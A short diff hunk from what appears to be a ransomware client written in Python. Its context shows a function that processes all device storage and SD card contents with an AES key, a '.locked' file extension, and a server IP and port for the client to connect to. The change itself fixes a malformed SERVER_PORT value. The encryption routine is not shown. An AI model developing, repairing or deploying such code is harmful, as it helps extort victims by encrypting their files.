@@ -126,7 +126,7 @@ def process_all_storage_and_sdcard(aes_key, encrypted_extension, status):
 if __name__ == "__main__":
     # Configure the client
     SERVER_IP = '192.168.1.6'  # Replace with the public IP of the server
-    SERVER_PORT = '192.168.1.1                # Port to connect to
+    SERVER_PORT = 8080                # Port to connect to
 
     encrypted_extension = ".locked"  # Change this if you want a different extension
     aes_key = generate_aes_key()
